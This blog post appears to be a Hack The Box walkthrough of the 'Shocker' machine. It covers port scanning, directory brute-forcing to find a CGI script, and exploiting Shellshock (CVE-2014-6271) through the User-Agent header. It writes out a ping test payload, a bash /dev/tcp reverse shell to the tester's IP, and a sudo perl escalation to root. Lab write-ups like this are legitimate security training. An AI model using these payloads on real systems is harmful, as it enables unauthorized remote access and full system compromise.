---
layout: post
title: "HTB: SHOCKER (10.10.10.56)"
description: "Shocker is an easy box from HackThe Box themed after the shellshock vulnerability in Bash. The directory Bruteforce becomes tricky since it requires a trailing slash which most wordlists dont have. Intresting enough dirb as able to find it which shows the improtance of not relying on just one tool Privesc was an easy GTFObin in Perl"
tags: [Bash, ShellShock, Environment Variables, CGI Scripts,  CVE-2014–6271, Reverse Shell, HTB, HackTheBox, Shocker, GTFObin, Pentestmonkey, nmap, BurpSuite, Proxy, Gobuster, dirb]
image: "/assets/img/shocker/feature.png"
---
## RECON
### Nmap

As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.

```shell
┌─[george@parrot]─[~/HTB/boxes/shocker]
└──╼ $ sudo nmap -p- --min-rate 10000 -oA nmap/allports 10.10.10.56
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-26 16:35 EAT
Warning: 10.10.10.56 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.56
Host is up (1.2s latency).
Not shown: 61851 closed tcp ports (reset), 3682 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

┌─[george@parrot]─[~/HTB/boxes/shocker]
└──╼ $ sudo nmap -sC -sV -p80,2222 -oA nmap/shocker 10.10.10.56
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-26 16:49 EAT
Nmap scan report for 10.10.10.56
Host is up (0.34s latency).
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.59 seconds
```

From the result we see two ports open. http (80) and ssh (2222).

Judging by the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version and the [Apache](https://packages.ubuntu.com/search?keywords=apache2) Version, it is likely the host is running Ubuntu 16.04.

## Port Enumeration
### Port 80.

The site is a simple website with just a funny image holding something that looks like an axe. ( fun fact: shoker is swahili word for an Axe :). )

![Website](/assets/img/shocker/bug.png)

The page source also doesnt revel much.

### Directory Bruteforce

I am a big fun of  `gobuster`, I tried it but it did not get anything which is strange.

```
┌─[george@parrot]─[~/HTB/boxes/shocker]                                             
└──╼ $ gobuster dir -u http://10.10.10.56/ -w /opt/Seclists/Discovery/Web-Content/directory-list-2.3-small.txt  -t 50                                                   
===============================================================
Gobuster v3.1.0                                                                     
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/
[+] Method:                  GET                                                                                                                                        
[+] Threads:                 50                                                     
[+] Wordlist:                /opt/Seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404                                                    
[+] User Agent:              gobuster/3.1.0                    
[+] Timeout:                 10s                                                    
===============================================================
2023/09/27 16:55:31 Starting gobuster in directory enumeration mode                 
===============================================================                                                                                                         

===============================================================
2023/09/27 17:03:49 Finished    
===============================================================
```
At this point, I decided to look for another wordlist and I found the `small.txt` and I get a hit.

```
┌─[george@parrot]─[~/HTB/boxes/shocker]
└──╼ $ gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirb/small.txt  -t 50                                                                                
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/09/27 18:03:53 Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 294]

===============================================================
2023/09/27 18:04:00 Finished
===============================================================
```
This was suprising since on the initial wordlist the `cgi-bin` also exists. Comparing the two i noticed why this was the case as the initial wordlist only had one `cgi-bin` and the `small.txt` has two with one having the trailing `/`

In general, when a web server receives a request for a directory without a trailing slash, it typically responds by redirecting the request to the same path but with the trailing slash added. However, in this specific situation, there is a directory on Shocker that, instead of performing this redirect, returns a "404 Not Found" error when accessed without the trailing slash.

```c
┌─[george@parrot]─[~/HTB/boxes/shocker]
└──╼ $ grep cgi-bin /opt/Seclists/Discovery/Web-Content/directory-list-2.3-small.txt                                                   
cgi-bin
fcgi-bin
cgi-bin2
pcgi-bin
scgi-bin
┌─[george@parrot]─[~/HTB/boxes/shocker]
└──╼ $ grep cgi-bin /usr/share/wordlists/dirb/small.txt                                                                                                                
cgi-bin
cgi-bin/
fcgi-bin
┌─[george@parrot]─[~/HTB/boxes/shocker]
└──╼ $
```

The Fix is simple.

```
┌─[george@parrot]─[~/HTB/boxes/shocker]
└──╼ $ grep cgi-bin /opt/Seclists/Discovery/Web-Content/directory-list-2.3-small.txt
cgi-bin
cgi-bin/
fcgi-bin
cgi-bin2
pcgi-bin
scgi-bin
┌─[george@parrot]─[~/HTB/boxes/shocker]
```
And now we are able to find it

```c
┌─[george@parrot]─[~/HTB/boxes/shocker]
└──╼ $ gobuster dir -u http://10.10.10.56/ -w /opt/Seclists/Discovery/Web-Content/directory-list-2.3-small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/Seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/09/27 18:11:00 Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 294]
Progress: 363 / 87666 (0.41%)                 ^C
[!] Keyboard interrupt detected, terminating.

===============================================================
```
One thing I note is the `cgi-bin` has a status code of `403` meaning we are not supposed to access it even with credentials. But what about the content of the directory?

In the most basic of terms, `CGI` or `Common Gateway Interface` is the process for scripts to communicate with your hosting server. The folder for CGI scripts is what we call the cgi-bin. It is created in the directory root of your website and where your scripts are permitted to run or execute.

Basically you will find executable scripts within this directory. I will Bruteforce for them using the same wordlist but add `-x` for extensions.

```c
┌─[george@parrot]─[~/HTB/boxes/shocker]
└──╼ $ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt  -t 50 -x php,sh,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh,txt
[+] Timeout:                 10s
===============================================================
2023/09/27 18:13:57 Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 118]

===============================================================
2023/09/27 18:14:14 Finished
===============================================================
```
And we get a hit. `user.sh`

Visiting `user.sh`, we get a file which firefox wants us to download.

![user.sh](/assets/img/shocker/user_file.png)

Content of the file seems like an output of the `uptime` command.

```
┌─[george@parrot]─[~/HTB/boxes/shocker]
└──╼ $ cat user.sh
Content-Type: text/plain

Just an uptime test script

 11:15:41 up  1:20,  0 users,  load average: 0.00, 0.00, 0.00


┌─[george@parrot]─[~/HTB/boxes/shocker]
```

## Shell as Shelly
### CVE-2014-6271 AKA Shellshock

ShellShock is a vulnerability within the Bash shell that permits remote code execution without requiring confirmation. This vulnerability arises from a specific string of seemingly random characters, () { :; };, which perplexes Bash, causing it to execute any code that follows by default. Notably, Windows systems are immune to this vulnerability. However, given that approximately 75% or more of the internet relies on Apache, with 80% of Apache servers operating on Linux, a significant portion of the internet remains susceptible to this threat. Bash functions are versatile, being employable in .sh scripts, one-liner commands, and even defined within environment variables.

Exploiting "Shellshock" requires establishing a means of communication with the Bash shell. When a CGI (Common Gateway Interface) is invoked, the web server, in this case, Apache, initiates a new process to execute the CGI script. In this context, it initializes a Bash process to run the CGI script. Apache requires a mechanism to transmit information to the CGI script, which it accomplishes through the use of environment variables. These environment variables are accessible within the CGI script and facilitate the transmission of various headers and other essential information from Apache. For instance, if a HTTP header named GEORGE is present in the request, it would result in the availability of an environment variable named HTTP_GEORGE within the CGI script.

### Testing for ShellShock

I will use a proxy for this, `BurpSuite`. To test, I will use the `User-Agent` with a simple POC and see how it responds.

```shell
() { :;}; /bin/bash -c 'ping -c 3 10.10.16.7'
```
This will make shocker reach out to my box using the `ICMP` protocol.

![user.sh](/assets/img/shocker/rce_testing.png)

On my box I will run `tcpdump` to capture the sent packets.

![user.sh](/assets/img/shocker/tcpdump.png)

And the POC works. We can now go ahead and get our shell.

For this I will use the bash one liner from [`Pentestmonkey`](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```shell
() { :;}; /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.7/9001 0>&1'
```
Sending the payload hangs the webserver which is a good sign. Looking at my `nc` session.

And I have access on the box

```
┌─[george@parrot]─[~/HTB/boxes/shocker]
└──╼ $ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.56] 53608
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$
```

## Shell as root
### Enumeration

I always start off with checking our `sudo` privilages using the `sudo -l` command.

```
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
We can see user `shelly` can run `perl` as root without any `password` denoted by `NOPASSWD`.

### Root

Heading over to [GTFObin](https://gtfobins.github.io/gtfobins/perl/) I find a privilage escalation using `perl -e`

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
shelly@Shocker:/usr/lib/cgi-bin$ cd /home/shelly
cd /home/shelly
shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/perl -e 'exec "/bin/sh";'
id
uid=0(root) gid=0(root) groups=0(root)
```
And thats the box. Thank you all for taking your time to read my blog post, stay tuned for the next!

Happy hacking!
